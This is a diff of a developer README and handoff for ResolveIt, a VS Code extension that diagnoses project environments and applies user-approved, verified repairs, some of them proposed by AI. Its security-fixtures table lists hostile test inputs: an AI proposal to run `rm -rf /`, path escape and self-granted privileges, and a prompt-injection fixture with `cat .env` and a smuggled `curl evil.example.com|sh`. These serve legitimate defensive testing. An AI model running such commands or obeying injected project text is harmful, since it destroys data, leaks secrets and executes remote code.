+6. **Review each proposed repair** — type, target, why, the exact change, scope, risk.
+7. **Approve individual changes** — `Allow` or `Skip` per card.
+8. **Apply approved repairs** — `Apply Approved Changes`.
+9. **Verification runs automatically** right after execution.
+10. **Review what remains** if verification fails, then re-analyze or re-plan.
 
-Integration fixtures in `tests/fixtures/integration/`:
+### Views
 
-| Fixture | Purpose |
-|---------|---------|
-| `healthy-python` | Zero blocking diagnostics — demonstrates clean project |
-| `healthy-node` | Zero blocking diagnostics — demonstrates clean Node project |
-| `healthy-go` | Zero blocking diagnostics — demonstrates clean Go project |
-| `healthy-rust` | Zero blocking diagnostics — demonstrates clean Rust project |
-| `healthy-java` | Zero blocking diagnostics — demonstrates clean Java project |
-| `healthy-cpp` | Zero blocking diagnostics — demonstrates clean C++ project |
-| `broken-python` | Missing dependency (`cryptography`) — demonstrates repair flow |
-| `broken-node` | Missing dependency — demonstrates Node repair flow |
-| `docker-security` | Privileged/socket/host-network Compose — diagnostic-only findings |
-| `secrets` | `.env` with fake secrets — verifies no leakage into requirements/diagnostics/audit |
-| `malformed-project` | Invalid manifest — parse-error diagnostic |
-| `multi-project` | Backend (Python) + Frontend (Node) + Worker (Go) + Docker — boundary checks |
-| `nested-projects` | Nested manifests — ownership, no double-counting |
+| View | Type | Contents |
+|---|---|---|
+| ResolveIt Action Hub | webview | Collapsed `◆ ResolveIt` control → radial hub → AI report screen |
+| ResolveIt Details | tree | Project name, issue status, action shortcuts, AI status, last run |
+| ResolveIt Diagnostics | tree | Grouped Critical / Errors / Warnings / Info with evidence |
+| ResolveIt Environment | tree | Runtimes, tools, package managers, Docker state |
+| ResolveIt Requirements | tree | Runtime, dependency, build-tool, container requirements |
 
-### Broken Python Fixture (Repair Flow Demonstration)
+### Commands
 
-`tests/fixtures/integration/broken-python/pyproject.toml` declares a dependency on `cryptography` that is not installed. Running ResolveIt produces a blocking diagnostic. The deterministic planner (or AI) proposes `install-dependency` with `pip`. User approves. Repair executes. Verification re-runs diagnostics and confirms resolution.
+| Command | ID |
+|---|---|
+| ResolveIt: Analyze Project | `resolveit.analyzeProject` |
+| ResolveIt: Generate Repair Plan | `resolveit.generateRepairPlan` |
+| ResolveIt: Apply Approved Repairs | `resolveit.applyApprovedRepairs` |
+| ResolveIt: Allow Repair Action | `resolveit.approveAction` |
+| ResolveIt: Skip Repair Action | `resolveit.skipAction` |
+| ResolveIt: Review Problems | `resolveit.reviewProblems` |
+| ResolveIt: Review Repairs | `resolveit.reviewRepairs` |
+| ResolveIt: Ask AI | `resolveit.askAI` |
+| ResolveIt: Retry AI | `resolveit.retryAI` |
+| ResolveIt: Show Details | `resolveit.showDetails` |
+| ResolveIt: Open AI Settings | `resolveit.openSettings` |
+| ResolveIt: Scan Project | `resolveit.scan` |
+| ResolveIt: Diagnose Project | `resolveit.diagnose` |
+| ResolveIt: Run ResolveIt | `resolveit.run` |
+| ResolveIt: Show Environment | `resolveit.environment` |
+| ResolveIt: Show Requirements | `resolveit.requirements` |
+| ResolveIt: Repair | `resolveit.repair` |
+| ResolveIt: Verify | `resolveit.verify` |
+
+### Settings
+
+| Setting | Default | Meaning |
+|---|---|---|
+| `resolveit.ai.provider` | `none` | `none`, `local`, or `external` |
+| `resolveit.ai.model` | `""` | Model name for the local/external provider |
+| `resolveit.ai.baseUrl` | `""` | Ollama-compatible or OpenAI-compatible base URL |
+| `resolveit.ai.timeout` | `30000` | AI request timeout (ms) |
+| `resolveit.maxIterations` | `3` | Agent repair iterations before failing |
+
+API keys are accepted **only** from environment variables, never from settings.
+
+---
+
+## Repair approval
+
+Approval is per action, and it is a hard gate.
+
+```
+Diagnostic → proposed action → Allow/Skip (per action) → Apply Approved Repairs
+          → PermissionManager re-check → tool.validate() → execute
+```
+
+- `Allow` records an approval in extension state. It does **not** execute anything.
+- `Skip` records a denial. Denied actions never execute.
+- `Apply Approved Changes` passes the approved action IDs down to the Core. The Core
+  re-validates each one and can still refuse.
+- If diagnostics have changed since the plan was generated, the plan is marked
+  **stale** and applying is blocked until a fresh report is prepared.
+- Actions whose IDs are not in the current plan are ignored (stale/hostile messages
+  from the webview are dropped and logged).
+- The legacy `ResolveIt: Repair` and `ResolveIt: Run ResolveIt` commands keep the
+  older flow: the plan is printed to the `ResolveIt` output channel, then each action
+  is confirmed via QuickPick (`Allow` / `Deny`).
+- Manual-only items (runtime upgrades, toolchain installs, Docker findings) are
+  reported with instructions and **never** run.
+
+### The five states — do not confuse them
+
+| Term | Meaning | Ran anything? |
+|---|---|---|
+| **Diagnostic** | A deterministic finding from the Core engine, with evidence | No |
+| **AI proposal** | A structured suggestion produced by the AI layer, then validated by the Core | No |
+| **Approved repair** | The user pressed `Allow` | No |
+| **Executed repair** | The Core `RepairExecutor` ran the validated tool | Yes |
+| **Verified repair** | Post-execution diagnostics + targeted checks confirm the issue is gone | Yes, and confirmed |
+
+**Approved ≠ Executed ≠ Succeeded ≠ Verified.** A repair that fails stays failed; it
+is never reported as resolved.
+
+---
+
+## Verification
+
+Verification is not optional and never inferred from an exit code.
+
+- After execution, the Core re-runs diagnostics and compares **stable diagnostic keys**
+  (category/code/requirement/file — never random IDs) to produce `resolved` and
+  `remaining` lists, plus any new regressions.
+- Filesystem-only targeted checks run per action: created file exists with expected
+  content, modified file contains the replacement, venv directory exists, installer
+  outcome recorded (with its no-inventory limitation stated).
+- Custom `VerificationRule`s run per action and AND into the result.
+- **Success requires zero remaining blocking diagnostics and zero failed targeted
+  checks.**
+- In the agent loop, failed verification re-observes, re-analyzes, and re-plans with
+  the new evidence, up to `maxIterations` (default 3), tracking failed action
+  fingerprints so an identical unsuccessful action is not repeated.
+- In the UI, `Verified` is shown only after verification passes. Note the known UI
+  defect described in [Current UI Status](#current-ui-status) — the `Verified` badge
+  on an individual card is currently too permissive.
+
+---
+
+## Example workflow
+
+This is a realistic walkthrough based on the bundled `broken-python` fixture and the
+actual CLI output. **It is an illustration of the flow, not a guarantee for every
+project.**
+
+**Project:** a Python application with `requires-python = "==2.7.*"`
+**Requirement:** Python `==2.7.*`
+**Environment:** Python 3.14.2
+
+1. **Diagnostic** — Core emits a blocking diagnostic:
+
+   ```
+   RUNTIME_RUNTIME-VERSION_MISMATCH  (category: runtime, severity: error)
+   python version 3.14.2 does not satisfy requirement ==2.7.*
+   Expected: ==2.7.*   Actual: 3.14.2
+   ```
+
+2. **Remediation candidates** — Core attaches `Install python ==2.7.*` and
+   `Upgrade python to ==2.7.*`, both at system-modification risk.
+
+3. **AI (optional)** — if an AI provider is configured, it is given this evidence and
+   may propose a structured action. If it proposes something invalid, Core rejects it
+   and the deterministic plan is used instead.
+
+4. **ResolveIt planning** — `DeterministicRepairPlanner` checks each candidate against
+   the real tool validators. **Runtime and toolchain diagnostics have no controlled
+   repair tool**, so they become a **manual action**, not an executable action. The
+   run halts at `awaiting-approval` with an explanation. Nothing is executed.
+
+   ```
+   $ node dist/cli/index.js run --path tests/fixtures/integration/broken-python --dry-run
+   AI planning fallback (ai-unavailable): AI unavailable, using deterministic planning
+   Agent Run: run-…
+   Status: awaiting-approval
+   Reason: Dry run stopped before modifications
+   Iterations: 1
+   Manual actions required:
+     - Manual action required: python version mismatch
+       (No controlled repair tool for runtime diagnostics; system-level change
+        requires explicit manual action)
+   ```
+
+**Where an automated repair *does* happen:** for dependency diagnostics in a
+supported ecosystem, or for a missing required file, Core can plan an executable
+`install-dependency` / `create-file` action. That action then follows the approval →
+execute → verify path, e.g. installing a declared Python package with `pip`:
+
+```
+Diagnostic: DEPENDENCY_PACKAGE-DEPENDENCY_MISMATCH (or an unmet dependency)
+Plan:       install-dependency { ecosystem: "pip", package: "<name>" }
+User:       Allow
+Repair:     InstallDependencyTool runs `pip install <name>` through the safe command runner
+Verify:     diagnostics re-run; targeted check records the installer outcome
+Result:     resolved, or remaining diagnostics reported honestly
+```
+
+**The example above deliberately shows the case ResolveIt refuses to automate.** A
+runtime downgrade is not something this tool will do for you, and it says so instead
+of guessing. Actual behavior depends on the project, the machine, and the AI
+provider; dependency status without a local inventory is reported as `unknown`, not
+as installed or missing.
+
+---
+
+## Test fixtures
+
+Integration fixtures live in `tests/fixtures/integration/` and are copied into a
+temporary directory by the tests, so the checked-in fixtures are never mutated.
+
+| Fixture | Contents | What it actually demonstrates |
+|---|---|---|
+| `healthy-python` | `pyproject.toml`, `requires-python >=3.8` | Clean project: zero blocking diagnostics under a controlled environment; deterministic planner proposes nothing |
+| `healthy-node` | `package.json`, `engines.node >=18` | Same for Node. This is also the workhorse fixture for staged repair, determinism, throwing-tool, and iteration-limit tests |
+| `healthy-go` | `go.mod`, `go 1.21` | Clean Go project |
+| `healthy-rust` | `Cargo.toml`, `rust-version 1.75` | Clean Rust project |
+| `healthy-java` | `pom.xml`, `java.version 17` | Clean Maven project |
+| `healthy-cpp` | `CMakeLists.txt`, `cmake_minimum_required 3.20` | Clean C++ project |
+| `broken-python` | `pyproject.toml`, **`requires-python = "==2.7.*"`**, `dependencies = ["requests>=2.0"]` | A **runtime version mismatch**, not a missing package. Produces a blocking `runtime` diagnostic and a **manual action** — the deterministic planner deliberately proposes **no executable action** |
+| `broken-node` | `package.json`, **`engines.node >=99.0.0`**, `lodash ^4.17.0` | An unsatisfiable runtime constraint: blocking diagnostic with evidence, plus a `system-modification` **manual action** and zero executable actions |
+| `docker-security` | `compose.yaml` with `privileged: true` + Docker socket mount | Yields both `CONTAINER_PRIVILEGED_MODE` and `CONTAINER_DOCKER_SOCKET`, and every `container` diagnostic has **zero remediation candidates** (diagnostic-only) |
+| `malformed-project` | Truncated `package.json` | Parse isolation: no crash, a `PROJECT_PARSE_ERROR` diagnostic with source and evidence |
+| `multi-project` | `backend/` (Python), `frontend/` (Node), `worker/` (Go), `docker/` (Compose) | Project boundaries, per-file requirement ownership, no duplicate files, stable ordering |
+| `nested-projects` | root `package.json` + `apps/inner/package.json` | Nested markers keep separate identity; no double-counting |
+| `secrets` | `compose.yaml` with fake credentials | No leakage of fake values into diagnostics. **Note:** the fixture's `.env` file is excluded by the repository's `.gitignore`, so a fresh clone contains only `compose.yaml` — the assertions still hold, they simply have less to assert against |
+
+### Where the automated repair flow *is* proven
+
+The fixtures above prove the **diagnostic and manual-remediation** paths. The
+**executed repair** path is proven in code, in `tests/integration-release.test.ts`
+and `tests/agent-e2e.test.ts`, which use the real planner, executor, and verifier
+against temporary directories:
+
+- approved + verified → `resolved`, with a real file written and read back
+- approved but the problem persists → verification **fails**, never a false success
+- denied → nothing performed, not resolved
+- a malicious package name → recorded as a failure with a validation error
+
+### Security fixtures
+
+`tests/fixtures/security/` contains deliberately hostile inputs used by
+`tests/security-hardening.test.ts`:
+
+| Fixture | Demonstrates |
+|---|---|
+| `malicious-ai-output/command-injection.json` | AI proposal asking to run `rm -rf /` via a `command` field — fully rejected |
+| `malicious-ai-output/privilege-escalation.json` | AI self-granting `read-only` and path-escaping `../../outside.txt` — fully rejected |
+| `prompt-injection/readme-instructions.json` | Project content attempting to drive the planner (`cat .env`, `lodash;curl evil.example.com\|sh`) — fully rejected |
+| `docker-privileged`, `docker-socket`, `docker-host-mount`, `docker-host-network`, `docker-capabilities`, `docker-unpinned` | Each Docker security rule fires on a known-bad config |
+| `docker-safe` | Negative control: a hardened config produces **zero** findings |
+| `secrets/samples.txt` | Inert sample strings for redaction tests. These are fake/documented example values, not real credentials |
+
+`tests/fixtures/ecosystems/` holds 20 further fixtures (npm/yarn/pnpm, Poetry, legacy
+Python, Meson/Conan/vcpkg, Go workspace, Gradle catalogs, .NET central packages,
+multi-project, nested, malformed) used to prove parser behaviour.
+
+---
 
 ## Testing
 
-### Root (Core)
+### Core (`/`)
 
 ```bash
-npm test          # 456 tests, ~80s
-npm run build     # TypeScript compilation
-npm run lint      # ESLint
-npx tsc --noEmit  # Type-check only
+npm install
+npm run build      # tsc
+npm test           # vitest run
+npm run lint       # eslint src
+npx tsc --noEmit   # type-check only
 ```
 
-### VS Code Extension
+### VS Code extension (`vscode/`)
 
 ```bash
 cd vscode
-npm test          # 135 tests, ~70s (includes build)
-npm run build     # typecheck + esbuild bundle
-npm run lint      # ESLint
-npm run validate-package  # Manifest/code parity + hygiene
-npm run package   # Creates .vsix
+npm install
+npm run build            # typecheck + esbuild bundle -> dist/extension.js
+npm test                 # vitest run (pretest rebuilds the bundle first)
+npm run lint
+npm run validate-package # manifest/code parity + packaging hygiene
+npm run package          # vsce package -> resolveit-0.0.1.vsix
 ```
 
-### Known Environmental Timeout/Flakiness
+The extension suite mocks the `vscode` API (`vscode/tests/vscode-mock.ts` plus a
+vitest alias), so **no VS Code instance is required** to run it. A bundle smoke test
+additionally loads the built `dist/extension.js` with a `Module._load` patch and
+asserts it activates and registers every contributed command and view.
 
-- **`tests/agent-e2e.test.ts`** (5 tests): ~77s total. These are integration-style tests that exercise the full agent loop with real file I/O and subprocess spawns. They pass reliably on Windows (tested on Node 24). On slower CI environments they may approach the default timeout. No flakiness observed in local runs.
-- **`tests/integration-release.test.ts`** (28 tests): ~2s. Exercises release matrix fixtures.
-- **`vscode/tests/commands.test.ts`** (19 tests): ~42s. Tests command orchestration with mocked VS Code API.
-- **`vscode/tests/integration.test.ts`** (25 tests): ~65s. Tests lifecycle, concurrency, error taxonomy, repair stages.
+### Verified results
 
-All tests currently pass (456 core + 135 extension = 591 total). The longer durations are due to real subprocess execution and deliberate test thoroughness, not flakiness.
+Run on Windows 11, Node v24.13.0, npm 11.6.2, during this handoff:
 
-## Docker Support
+| Check | Command | Result |
+|---|---|---|
+| Core build | `npm run build` | pass |
+| Core typecheck | `npx tsc --noEmit` | pass |
+| Core lint | `npm run lint` | pass, no findings |
+| Core tests | `npm test` | **28 files, 457 tests, all passing** (~84–100 s) |
+| Extension build | `vscode/ npm run build` | pass (typecheck + esbuild bundle) |
+| Extension lint | `vscode/ npm run lint` | pass, no findings |
+| Extension tests | `vscode/ npm test` | **8 files, 135 tests, all passing** (~70–75 s, includes rebuild) |
+| Package validation | `vscode/ npm run validate-package` | pass |
+| VSIX packaging | `vscode/ npm run package` | pass — `resolveit-0.0.1.vsix`, 5 files, 91.73 KB |
+| CLI `--help` / `--version` | `node dist/cli/index.js --help` | exit 0, no stack trace |
+| Local AI status | `node dist/cli/index.js ai` | `local` / `gemma3:4b` / available |
 
-ResolveIt currently has **Docker/Compose analysis (diagnostic/static only)**.
+No test is skipped, focused, or marked todo in either suite.
 
-### Can Do
+`vsce package` emits two non-fatal warnings, both expected:
 
-- Detect `Dockerfile` and `Compose` files
-- Inspect Docker configuration
-- Diagnose certain Docker security risks:
-  - Privileged mode → Critical
-  - Docker socket mounts → Critical
-  - Host filesystem mounts → Error/Warning
-  - Host networking / host PID/IPC → Error
-  - Dangerous capabilities → Error
-  - Unpinned images → Warning (posture, never framed as malicious)
-  - Broad build contexts → Warning
-- Inspect images, platforms, build contexts
+- `LICENSE, LICENSE.md, or LICENSE.txt not found` — the license lives at the repo
+  root, not inside `vscode/`, and `vsce` only looks in the extension root. The
+  manifest already declares `"license": "MIT"`. Packaging still succeeds; it would
+  only matter for a Marketplace submission, which is explicitly out of scope.
+- `The file extension/dist/extension.js is large (443.65 KB)` — an unminified
+  esbuild bundle of Core + extension. Acceptable for a pre-release.
 
-### Does NOT Do (Explicit)
+### Slow tests and environment sensitivity
 
-- Build images
-- Start containers
-- Stop containers
-- Modify Dockerfiles
-- Modify Compose files
-- Remediate Docker security findings (no repair candidates attached)
-- Verify live containers
+These are **not flaky** — they are slow, and the reason is real work (real filesystem
+scans and real subprocess probes for runtimes and tools). Expect them to dominate CI
+time:
 
-**ResolveIt itself is not Docker-deployable** — no Dockerfile/container deployment exists or has been tested.
+| Suite | Duration in this run | Why |
+|---|---|---|
+| `tests/agent-e2e.test.ts` (5 tests) | ~71 s | Full agent loop on real temp workspaces; three tests carry an explicit 120 s timeout |
+| `tests/agent-run.test.ts` (36 tests) | ~19 s | Real observation + verification engines |
+| `tests/security-hardening.test.ts` (42 tests) | ~5 s | Large-input and audit-bound cases (explicit 30 s timeout) |
+| `vscode/tests/integration.test.ts` (25 tests) | ~55 s | One real end-to-end diagnose → deny → verify flow (explicit 120 s timeout) |
+| `vscode/tests/commands.test.ts` (19 tests) | ~39 s | One real Core agent run to `resolved` (explicit 120 s timeout) |
 
-## UI / UX History
+Because those tests probe the real machine, **they will be slower on a host missing
+runtimes and toolchains** — every missing tool costs a PATH lookup that has to fail
+first. This is a known environmental sensitivity, not a defect. No timeout failure was
+observed in this handoff run.
 
-### Original Interface (Phase 8–12)
+`tests/environment/command-runner.test.ts` is the only test that deliberately spawns
+real processes, and it is written for Windows (`cmd /c ...`). The environment
+adapters are unit-tested across win32/linux/darwin by overriding `process.platform`,
+but **manual validation was performed on Windows only**.
 
-Native VS Code sidebar/tree-based interface with four Explorer views:
-- ResolveIt Details
-- ResolveIt Diagnostics
-- ResolveIt Environment
-- ResolveIt Requirements
+---
 
-### Phase 13: Dashboard Redesign
+## Docker support
 
-A dashboard redesign was attempted to make the UI easier to understand. The dashboard approach was still considered too difficult to navigate.
+ResolveIt has Docker/Compose **analysis** — static, diagnostic only.
 
-### Phase 14: Action Hub (Current)
+### It can
 
-The desired UX is a **ResolveIt Action Hub** inspired by quick-access overlays on gaming phones.
+- detect `Dockerfile` / `Containerfile` / `*.dockerfile` and Compose files
+  (`docker-compose.{yml,yaml}`, `compose.{yml,yaml}`)
+- parse image references, digests, `--platform`, private registries with ports, `ARG`,
+  and build contexts
+- diagnose Docker/Compose security misconfigurations:
 
-**Desired Mental Model:**
+  | Finding | Code | Severity |
+  |---|---|---|
+  | Privileged mode | `CONTAINER_PRIVILEGED_MODE` | critical |
+  | Docker socket mount | `CONTAINER_DOCKER_SOCKET` | critical |
+  | Host filesystem mount | `CONTAINER_HOST_MOUNT` | error / warning |
+  | Host networking | `CONTAINER_HOST_NETWORK` | error |
+  | Host PID / IPC | `CONTAINER_HOST_PID_IPC` | error |
+  | Dangerous capabilities (`SYS_ADMIN`, `NET_ADMIN`, …) | `CONTAINER_DANGEROUS_CAPABILITY` | error |
+  | Unpinned image / broad build context | `CONTAINER_UNPINNED_IMAGE`, `CONTAINER_BROAD_BUILD_CONTEXT` | warning |
+
+  Unpinned images are framed as **posture**, never as malicious.
+- report Docker daemon state as part of environment inspection
+
+### It explicitly does NOT
+
+- build images
+- start, stop, or restart containers
+- modify `Dockerfile` or Compose files
+- remediate any Docker security finding (these diagnostics carry **no remediation
+  candidates**, so no repair tool can apply them)
+- verify live containers
+- manage images, volumes, or networks
+
+**ResolveIt itself is not Docker-deployable.** No Dockerfile or container deployment
+for ResolveIt exists in this repository, and none has been tested. Do not describe it
+as a container-based solution.
+
+---
+
+## UI / UX history
+
+This section matters if you are picking up the UI work. The UI has been redesigned
+twice and the current result is **not** what was originally asked for.
+
+### Phase 8–12: native tree views
+
+The first interface was a conventional VS Code extension UI: four Explorer tree views
+(details, diagnostics, environment, requirements), QuickPick approval dialogs,
+output-channel logs, and a status bar item. It worked and is still present.
+
+### Phase 13: dashboard redesign (attempted)
+
+A status-dashboard webview was introduced to make the state of the project easier to
+read at a glance (health, counts, AI status, proposed repairs, verification result).
+It shipped, it is still in the codebase under `vscode/src/dashboard/`, and it is
+still tested. **It was judged too difficult to navigate** and was not adopted as the
+primary experience.
+
+### Phase 14: Action Hub (current)
+
+The target UX is a **ResolveIt Action Hub** inspired by the quick-access overlays on
+gaming phones — invoke it, and a focused surface appears with ResolveIt in the centre
+and the actions around it:
 
 ```
 User invokes ResolveIt
       ↓
 A focused ResolveIt surface appears
       ↓
-ResolveIt is in the center
+ResolveIt is in the centre
       ↓
 Clear actions surround it
 ```
 
-**Conceptual Actions:**
-- Analyze Project
-- Diagnostics
-- AI Report
-- Apply Changes
+Conceptual actions: **Analyze Project · Diagnostics · AI Report · Apply Changes**, in
+a visual radial arrangement.
 
-The user specifically wants a **visual radial/pentagonal interaction**.
+### What was actually built
 
-### Current Implementation Status
+A radial hub was implemented (`vscode/src/hub/`) — a collapsed `◆ ResolveIt` control
+that expands into four nodes positioned around a central diamond, with SVG connector
+lines, plus a focused AI-report screen inside the same view. It is registered as the
+`resolveit.dashboard` **WebviewView** in the Explorer sidebar.
 
-The Action Hub is implemented as a **WebviewView in the Explorer sidebar** (`vscode/src/hub/` + `vscode/src/dashboard/`). It renders a collapsed `◆ ResolveIt` control that expands into a radial hub with four actions around the center, plus a focused AI report screen (Approve → Apply → Verify).
+**It is not a floating overlay.** See below.
 
-## Important UI Limitation / Unfinished Work
+---
 
-**Be extremely honest here.**
+## Current UI status
 
-The exact desired interaction is:
+Read this before touching the UI.
 
-```
-Normal VS Code editor
-         ↓
-User invokes ResolveIt
-         ↓
-ResolveIt appears as a focused popup/overlay-like surface
-         ↓
-User chooses an action
-```
+### The desired interaction is not implemented
 
-The current implementation **uses a WebviewView/sidebar** (Explorer view). It does **NOT yet match the desired floating/quick-access UX**.
-
-The desired implementation should use a supported VS Code mechanism such as a **WebviewPanel** (which can be positioned as a modal/centered overlay) rather than trying to inject arbitrary HTML into the VS Code editor DOM.
-
-### Known UI State/Presentation Bugs (observed during manual testing)
-
-1. **Action Hub stuck on "Loading ResolveIt..."** for an extended period during manual testing
-2. **Invalid AI repair proposal displayed**: `Unsupported ecosystem: undefined`
-   - Core validation correctly rejected the invalid action
-   - However, the UI displayed contradictory state:
-     - `Failed` badge
-     - `Approved` badge (simultaneously)
-     - `Allow` / `Skip` buttons still visible
-   - This is a **UI state/presentation bug**, not a reason to weaken Core validation
-   - Correct behavior should be:
-     - Proposal rejected / blocked
-     - No `Allow` button
-     - No `Approved` badge
-     - No execution
-     - Clear explanation to user
-
-A corrective pass may still be required to move the Action Hub from a permanent sidebar `WebviewView` to an on-demand `WebviewPanel`.
-
-## Known Limitations
-
-Verified against actual code:
-
-- No full dependency solver; locked/transitive entries get manual guidance
-- Runtime/toolchain gaps produce manual remediation paths, not silent installs
-- Dependency inventory can be `unknown` rather than falsely assumed
-- Docker support is diagnostic-only (never starts/modifies containers)
-- Multi-root VS Code workspaces analyze the first folder only
-- Some core operations are not abortable (cancellation detaches UI, discards late results)
-- No elevation/sudo automation; system changes stay explicitly manual
-- Environment probing can be slow on machines missing tools
-- No CVE vulnerability database integration
-- No dedicated secret scanner (redaction only)
-- No Docker remediation
-- AI quality depends on the selected model
-- Local AI can produce invalid proposals which Core safely rejects
-- VSIX installation is currently manual (not published to marketplace)
-- UI Action Hub still needs final UX correction (sidebar WebviewView → floating WebviewPanel)
-- Linux/macOS behavior covered by unit tests; manual validation performed on Windows
-
-## Project History
-
-Verified from git history:
-
-| Phase | Commit | Description |
-|-------|--------|-------------|
-| 0 | 2743fe5 | Establish ResolveIt architecture (interfaces, models, CLI skeleton) |
-| 1 | 67b8089 | Workspace and project discovery |
-| 2 | 225200d, 0e3fe7c | Environment intelligence (runtimes, tools, package managers, containers) |
-| 3 | e615f5e | Dependency and requirement intelligence (multi-ecosystem parsers) |
-| 4 | 760b53b | Diagnostic engine (rules for runtime, toolchain, dependency, build, container, project, Docker security) |
-| 5 | 1299796 | Repair and permission system (tools, registry, executor, snapshots, audit) |
-| 6 | d47225b | Verification and agent loop (state machine, observation, analysis, planning, approval, execution, verification, re-planning) |
-| 7 | 02bd64e | AI provider abstraction (No AI, Local AI/Ollama, External AI/OpenAI-compatible) |
-| 8 | a51db11 | VS Code extension (thin client, commands, tree views, QuickPick approval) |
-| 9 | faa3842 | Extension/Core integration hardening (workspace lifecycle, concurrency, events, errors, packaging) |
-| 10 | ed4d45d | Multi-ecosystem hardening (project detection, analyzer registry, normalized requirements, deterministic diagnostics) |
-| 11 | 7f58fba | Security, Docker & audit hardening (threat model, filesystem boundary, AI trust boundary, command execution policy, audit model, limits) |
-| 12 | c65fc91 | Final integration / release validation (release matrix, truthfulness, determinism, failure injection, VSIX round-trip) |
-| 13 | 70632e2 | UI/UX redesign (dashboard attempt) |
-| 14 | 82e3600 | Action Hub (radial hub, AI report screen, approval flow) |
-
-## Developer Handoff
-
-### What Has Already Been Built
-
-- **Complete deterministic core**: Workspace/Project discovery, Environment intelligence, Requirement parsing (13 ecosystems), Diagnostic engine (7 rule categories), Repair engine (4 tools + registry), Verification engine, Agent loop (observe→analyze→plan→approve→act→verify→replan), AI provider abstraction (3 providers), Audit logging with secret redaction, Safety/permission layer
-- **VS Code extension**: Thin client over Core, Action Hub (radial webview), 4 Explorer tree views, 20+ commands, settings integration, operation coordination, error taxonomy, packaging validation
-- **Test infrastructure**: 456 core tests + 135 extension tests, mocked VS Code API, integration fixtures (healthy/broken/multi-project/nested/Docker/secrets), security hardening tests
-- **CLI**: `scan`, `environment`, `requirements`, `diagnose`, `run`, `repair`, `ai` with JSON/human output, dry-run, per-action approval
-
-### What Is Stable
-
-- Core architecture and data models (`src/core/`, `src/index.ts`)
-- Safety architecture: `PermissionManager`, `RepairExecutor`, `AuditLogger`, path containment, secret redaction
-- AI provider abstraction and validation pipeline
-- Diagnostic engine and rule registry
-- Repair tool registry and validated tools
-- Extension/Core boundary (public API only via `src/index.ts`)
-
-### What Should Not Be Changed Casually
-
-- `src/safety/` — permission levels, path containment, secret redaction
-- `src/repair/registry.ts` + `src/repair/tools/` — tool validation, allowlists
-- `src/ai/validation.ts` — AI plan validation (the trust boundary)
-- `src/agent/run-state.ts` — agent state machine transitions
-- `src/core/interfaces.ts` + `src/core/models.ts` — public contracts
-
-### What Remains Unfinished
-
-1. **Action Hub UX**: Move from sidebar `WebviewView` to on-demand `WebviewPanel` (floating overlay)
-2. **UI state bugs**: Fix contradictory `Failed` + `Approved` display, remove `Allow`/`Skip` for rejected proposals
-3. **Loading state**: Resolve "Loading ResolveIt..." hang
-4. **Package validation**: Consider if `AuditLoggerImpl.query` stub should be implemented
-
-### Where to Start (UI Work)
+The desired interaction is:
 
 ```
-vscode/
-├── src/
-│   ├── hub/           # Action Hub (model, render, view) — PRIMARY
-│   ├── dashboard/     # Legacy dashboard helpers (cards, messages, model, render, snapshot)
-│   ├── views/         # Tree views (diagnostics, environment, project, requirements)
-│   ├── commands.ts    # Command registration
-│   ├── state.ts       # Extension state management
-│   ├── operations.ts  # OperationCoordinator (concurrency, cancellation)
-│   ├── core.ts        # CoreClient (thin Core API wrapper)
-│   └── extension.ts   # Extension entry point
+normal VS Code editor
+        ↓
+user invokes ResolveIt
+        ↓
+ResolveIt appears as a focused popup / overlay-like surface
+        ↓
+user chooses an action
 ```
 
-## Example Workflow
+**The current implementation is a permanent sidebar `WebviewView`
+(`resolveit.dashboard`, registered with `registerWebviewViewProvider` in
+`vscode/src/extension.ts:201`).** It does **not** match the desired
+floating/quick-access UX. The hub expands *inside the sidebar*; it never floats over
+the editor.
 
-**Project**: Python application  
-**Requirement**: `cryptography` (declared in `pyproject.toml`)  
-** Environment**: `cryptography` not installed / unknown  
+The next implementation should use a **supported** VS Code mechanism — a
+`WebviewPanel` created on demand (`vscode.window.createWebviewPanel`) — rather than
+injecting arbitrary HTML into the editor DOM, which is not supported and will break
+on every VS Code release.
 
-1. **Diagnostic**: `dependency-requirement-unmet` — "Requirement 'cryptography' cannot be confirmed"
-2. **AI** (if enabled): Proposes `install-dependency` with `{ ecosystem: "python", package: "cryptography", version: "latest" }`
-3. **ResolveIt**: Validates action — tool exists (`InstallDependencyTool`), parameters allowlisted, path contained, permission level = project-modification
-4. **User**: Clicks `Allow` on the proposal card
-5. **Repair**: `RepairExecutor` runs `pip install cryptography` via safe command runner
-6. **Verification**: Diagnostics re-run — `cryptography` now confirmed
-7. **Result**: `Resolved` (or `Verification failed` with remaining issues if something else is wrong)
+Note for context: `vscode/README.md` previously justified the sidebar placement with
+"VS Code does not allow overlays on the editor". That is misleading — VS Code
+supports editor-area webview panels and even auxiliary-bar views. The limitation is
+that this implementation was not converted, not that the platform forbids it.
 
-*This example demonstrates the flow. Actual behavior depends on environment state and AI provider.*
+### Bugs observed during manual testing (reproduce before fixing)
 
-## Project Structure
+1. **Action Hub stuck on "Loading ResolveIt…"** for an extended period. The view's
+   initial HTML ships that placeholder (`vscode/src/hub/view.ts:115`) and only replaces
+   it when the first `render` message arrives from the extension host. `postState()` is
+   called synchronously at the end of `resolveWebviewView`
+   (`vscode/src/hub/view.ts:33`), immediately after `webview.html` is assigned — the
+   inline script that installs the `message` listener has usually not run yet, so the
+   message is dropped. There is no timeout, no retry, and no error state.
+
+2. **Invalid AI repair proposal surfaced in the UI** with the text
+   `Unsupported ecosystem: undefined`. That string comes from Core:
+   `src/repair/tools/install-dependency.ts:98` rejects an `install-dependency` action
+   whose `ecosystem` parameter is missing or unsupported. **Core validation behaved
+   correctly — the invalid action was rejected.**
+
+3. **The UI then displayed contradictory state for that same action**: a `Failed`
+   lifecycle badge *and* an `Approved` badge, with `Allow` / `Skip` buttons still
+   rendered and interactive. This is a **UI state/presentation bug**, not a reason to
+   weaken Core validation.
+
+   Root causes visible in the code:
+   - `vscode/src/dashboard/cards.ts:126` — `toRepairCard` sets `lifecycle = 'failed'`
+     but leaves `approval` as `'approved'`, so both labels are printed
+     (`vscode/src/hub/render.ts:124`).
+   - `vscode/src/hub/render.ts:140` — `Allow`/`Skip` buttons are rendered
+     unconditionally, regardless of lifecycle, so a failed or rejected action still
+     offers approval controls.
+   - `vscode/src/hub/view.ts:86` — `verified` is computed as
+      `verifiedKeys.size > 0`, where `verifiedKeys` is built from
+      `verification.resolved`. An executed action is therefore labelled **Verified**
+      whenever *any* diagnostic was resolved, rather than when *that* action's problem
+      was resolved. This directly undermines the
+      `approved ≠ executed ≠ succeeded ≠ verified` guarantee in the UI.
+
+   **Correct behaviour should be:**
+   - proposal shown as rejected / blocked
+   - no `Allow` button (nothing to allow — it was never a valid action)
+   - no `Approved` badge
